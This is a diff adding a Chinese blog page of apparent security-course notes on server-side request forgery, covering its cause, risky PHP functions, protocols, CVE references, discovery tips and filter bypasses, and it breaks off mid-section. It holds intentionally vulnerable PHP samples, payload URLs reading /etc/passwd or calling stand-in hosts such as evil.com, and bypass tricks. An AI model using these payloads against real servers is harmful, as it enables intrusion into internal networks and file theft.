@@ -1,0 +1,686 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="https://sun-spots.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="https://sun-spots.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="https://sun-spots.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/SSRF/">
+
+
+
+  <title>
+ |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2022-03-08 09:12:16">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-03-08T09:12:16+08:00">2022-03-08</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipex2cdtbj20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicm07ih54j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://sun-spots.github.io/2022/03/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%89%E5%91%A8/SSRF/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="一知识回顾"><a class="markdownIt-Anchor" href="#一知识回顾">#</a> 一：知识回顾</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.什么是XSS？</span><br><span class="line"><span class="number">2</span>.XSS攻击方式都有哪些？</span><br><span class="line"><span class="number">3</span>.XSS三种攻击方式的区别？</span><br><span class="line"><span class="number">4</span>.XSS漏洞造成的危害？</span><br><span class="line"><span class="number">1</span>.什么是CSRF？</span><br><span class="line"><span class="number">2</span>.CSRF漏洞该怎样挖掘？</span><br></pre></td></tr></table></figure>
+<p>》》》今日目标《《《</p>
+<ol>
+<li>
+<p>掌握 SSRF 漏洞原理</p>
+</li>
+<li>
+<p>掌握 SSRF 攻击方式</p>
+</li>
+<li>
+<p>掌握 SSRF 挖掘姿势</p>
+</li>
+<li>
+<p>熟悉 SSRF 防御手法</p>
+</li>
+</ol>
+<h1 id="二ssrf漏洞"><a class="markdownIt-Anchor" href="#二ssrf漏洞">#</a> 二：SSRF 漏洞</h1>
+<p>漏洞概述：</p>
+<p>SSRF (Server-Side Request Forgery, 服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF 攻击的目标是外网无法访问的内部系统 (正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统) ；</p>
+<p><img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646443801811-991a35f1-3029-465e-abb0-ee56867c8fd8.png" alt="img"></p>
+<h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理">#</a> 》》》漏洞原理《《《</h3>
+<p>SSRF 形成的原因大都是由于服务端提供了 <code>从其他服务器应用获取数据的功能</code> ，且 <code>没有对目标地址做过滤与限制</code> 。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，文档，等等。</p>
+<h3 id="高危函数"><a class="markdownIt-Anchor" href="#高危函数">#</a> 》》》高危函数《《《</h3>
+<p>一. <code>curl_exec()</code> ：执行给定的 curl 会话… 这个函数应该在初始化一个 curl 会话并且全部的选向都被设置后调用…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line"><span class="comment">//file:///etc/passwd  读取文件</span></span><br><span class="line"><span class="comment">//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br></pre></td></tr></table></figure>
+<p>✪利用姿势：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.yuque.com/docs/share/36d86bd2-c5ce-413f-9c8a-a4a66946478d?#（密码：wbga） 《SSRF(curl)》</span></span><br></pre></td></tr></table></figure>
+<p>☠注意问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_exec() <span class="comment">//默认不跟踪跳转</span></span><br><span class="line">curl/libcurl <span class="number">7.43</span> 上gopher协议存在bug(%<span class="number">00</span>截断) 经测试<span class="number">7.49</span> 可用</span><br></pre></td></tr></table></figure>
+<p>二. <code>file_get_contents()</code> : 函数的作用是将整个文件读入一个字符串中，并且此函数是用于把文件的内容读入到一个字符串中的首选方法…</p>
+<p>例：以下代码执行的结果则是输出 test.txt 文件里的字符串…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>小实验：从用户指定的 URL 获取图片并保存在电脑上…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#保存成PUT.html</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">      &lt;title&gt;提交&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;form action=<span class="string">&quot;file_put_contents.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;提交一个url：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;url&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="comment">#保存成file_get_contents.php并与PUT.html一个文件夹</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;D:/images/&#x27;</span>.rand().<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">代码分析：</span><br><span class="line"><span class="keyword">isset</span>函数是判断有没有提交url;</span><br><span class="line">第四行<span class="variable">$content</span>变量将远程URL中的内容保存到content变量中;</span><br><span class="line">第五行随机生成一个文件路径;(.rand()随机生成一个字符串)</span><br><span class="line">第六行获取了远程的内容后将其写到新的文件中;</span><br><span class="line">第七行输出url;</span><br></pre></td></tr></table></figure>
+<p>操作步骤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.在D盘下创建images文件夹，并给anonymouse全部权限...</span><br><span class="line"><span class="number">2</span>.PHPStudy下访问PUT.html文件并填入要下载图片的地址，点击提交....</span><br><span class="line"><span class="number">3</span>.进入D盘下的images文件夹中查看下载图片</span><br></pre></td></tr></table></figure>
+<p>☢利用姿势：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.yuque.com/docs/share/06b28b2a-b034-4879-a35c-4434ac911cb8?#（密码：vgsr） 《SSRF(file_get_content)》</span></span><br></pre></td></tr></table></figure>
+<p>☠注意问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents支持php:<span class="comment">//input协议</span></span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的<span class="number">302</span>跳转会出现bug，导致利用失败</span><br></pre></td></tr></table></figure>
+<p>三. <code>fsockopen()</code> : 打开一个网络连接或套接字连接…</p>
+<p>1. 使用 fsockopen 函数实现获取用户制定 url 的数据（文件或者 html）…</p>
+<p>2. 这个函数会使用 socket 跟服务器建立 tcp 连接，传输原始数据…</p>
+<p>3.fsockopen 本身就是打开一个网络连接或者 Unix 套接字连接…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>攻击用到的协议：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>攻击姿势</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file</td>
+<td>在有回显的情况下，利用 file 协议可以读取任意内容</td>
+</tr>
+<tr>
+<td>dict</td>
+<td>泄露安装软件版本信息，查看端口，操作内网 redis 服务等</td>
+</tr>
+<tr>
+<td>gopher</td>
+<td>gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell</td>
+</tr>
+<tr>
+<td>http/s</td>
+<td>探测内网主机存活</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br><span class="line">ssrf.php?url=ftp://evil.com:12345/TEST</span><br><span class="line"></span><br><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line"></span><br><span class="line">Dict://</span><br><span class="line">dict://<span class="tag">&lt;<span class="name">user-auth</span>&gt;</span>@<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/d:<span class="tag">&lt;<span class="name">word</span>&gt;</span></span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line"></span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line"></span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:3306</span><br></pre></td></tr></table></figure>
+<h3 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式">#</a> 》》》攻击方式《《《</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">无视CDN</span><br><span class="line">进行跳板</span><br><span class="line">利用 file 协议读取本地文件等...</span><br><span class="line">攻击运行在内网或本地的应用程序...</span><br><span class="line">利用Redis未授权访问，HTTP CRLF注入实现GetShell</span><br><span class="line">对内网 Web 应用进行指纹识别，识别企业内部的资产信息...</span><br><span class="line">对外网服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息...</span><br><span class="line">攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击(比如 struts2、SQli 等)....</span><br></pre></td></tr></table></figure>
+<h1 id="三应用攻击"><a class="markdownIt-Anchor" href="#三应用攻击">#</a> 三：应用攻击</h1>
+<p>☀CVE 系列：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">###CVE-2014-4210:Weblogic SSRF漏洞</span><br><span class="line">https://www.yuque.com/docs/share/d55ec421-82b7-43bf-95d3-9c17b3f0b880?#（密码：kvls） 《CVE-2014-4210：Weblogic SSRF漏洞》</span><br><span class="line"></span><br><span class="line">###CVE-2021-27905:Apache Solr SSRF漏洞</span><br><span class="line">https://www.yuque.com/docs/share/32e3ceba-4df6-4631-928c-37b75720a02d?# 《CVE-2021-27905：Apache Solr SSRF》</span><br></pre></td></tr></table></figure>
+<h1 id="四挖掘防御"><a class="markdownIt-Anchor" href="#四挖掘防御">#</a> 四：挖掘防御</h1>
+<h3 id="漏洞种类"><a class="markdownIt-Anchor" href="#漏洞种类">#</a> 》》》漏洞种类《《《</h3>
+<h4 id="1显示响应"><a class="markdownIt-Anchor" href="#1显示响应">#</a> 1. 显示响应</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它显示对攻击者的响应，因此在服务器获取攻击者要求的URL后，它将把响应发送回攻击者。返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码；</span><br></pre></td></tr></table></figure>
+<h4 id="2不显示响应"><a class="markdownIt-Anchor" href="#2不显示响应">#</a> 2. 不显示响应</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和上面正好相反，不会返回结果到客户端。当您从未从初势请求中获取有关目标服务的任何信息时，就会发生这种ssrf。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSbin等类似工具。这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的。这种ssrf通常易于验证，但难以利用；</span><br></pre></td></tr></table></figure>
+<h4 id="3semi-ssrf"><a class="markdownIt-Anchor" href="#3semi-ssrf">#</a> 3.Semi-SSRF</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">与Blind相似，这种ssrf不会返回相关结果请求的所有详细信息，但是会暴露一些数据。这可能是部分数据或错误信息，他们为攻击者提供了更多信息；有时，关于请求的元数据（例如响应时间）也可以视为Semi-ssrf，因为它们允许攻击者验证请求是否成功；</span><br><span class="line">这种ssrf通常足以验证漏洞，但并不总是能够提取敏感数据；</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞挖掘"><a class="markdownIt-Anchor" href="#漏洞挖掘">#</a> 》》》漏洞挖掘《《《</h3>
+<h3 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2022/png/2699750/1646463986394-172ce5bc-f2dc-41d8-89d3-c4192997be85.png" alt="img"></h3>
+<h4 id="一从web功能寻找"><a class="markdownIt-Anchor" href="#一从web功能寻找">#</a> 一：从 WEB 功能寻找</h4>
+<ol>
+<li>分享：通过 URL 地址分享网页内容</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">○ 早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的&lt;tilte&gt;&lt;/title&gt;标签或者&lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;&quot;</span>/&gt;标签中content的文本内容作为显示以提供更好的用户体验;</span><br><span class="line">○ 通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞;</span><br><span class="line">○ 从国内某漏洞提交平台上提交的SSRF漏洞，可以发现包括淘宝、百度、新浪等国内知名公司都曾被发现过分享功能上存在SSRF的漏洞问题;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务；</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>在线翻译：通过 URL 地址翻译对应文本的内容。比如百度翻译，有道等；</p>
+</li>
+<li>
+<p>图片加载与下载：通过指定的 URL 地址加载或下载图片；</p>
+</li>
+<li>
+<p>图片文章收藏功能：从分享的 URL 中读取其原文的标题等；</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">○ 未公开的api实现以及其他调用URL的功能；此处类似的功能有<span class="number">360</span>提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容；</span><br></pre></td></tr></table></figure>
+<h4 id="二从url关键字寻找"><a class="markdownIt-Anchor" href="#二从url关键字寻找">#</a> 二：从 URL 关键字寻找</h4>
+<p>在对功能上存在 SSRF 漏洞中 URL 地址特征的观察，大致有以下关键字…</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>关键字</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>u</td>
+</tr>
+<tr>
+<td>2</td>
+<td>3g</td>
+</tr>
+<tr>
+<td>3</td>
+<td>src</td>
+</tr>
+<tr>
+<td>4</td>
+<td>url</td>
+</tr>
+<tr>
+<td>5</td>
+<td>wap</td>
+</tr>
+<tr>
+<td>6</td>
+<td>share</td>
+</tr>
+<tr>
+<td>7</td>
+<td>link</td>
+</tr>
+<tr>
+<td>8</td>
+<td>source</td>
+</tr>
+<tr>
+<td>9</td>
+<td>target</td>
+</tr>
+<tr>
+<td>10</td>
+<td>display</td>
+</tr>
+<tr>
+<td>11</td>
+<td>domain</td>
+</tr>
+<tr>
+<td>12</td>
+<td>sourceURI</td>
+</tr>
+<tr>
+<td>13</td>
+<td>imageURL</td>
+</tr>
+</tbody>
+</table>
+<h3 id="漏洞绕过"><a class="markdownIt-Anchor" href="#漏洞绕过">#</a> 》》》漏洞绕过《《《</h3>
+<p>### 常见限制</p>
+<ol>
+<li>限制为 http://www.xxx.com 域名</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br></pre></td></tr></table></figure>
+<ol>
+<li>限制请求 IP 不为内网地址</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">（2）采取特殊域名</span><br><span class="line">（3）采取进制转换</span><br></pre></td></tr></table></figure>
+<ol>
+<li>限制请求只为 HTTP 协议</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br></pre></td></tr></table></figure>
+<p>### 绕过方法</p>
+<p>方法一：“@”</p>
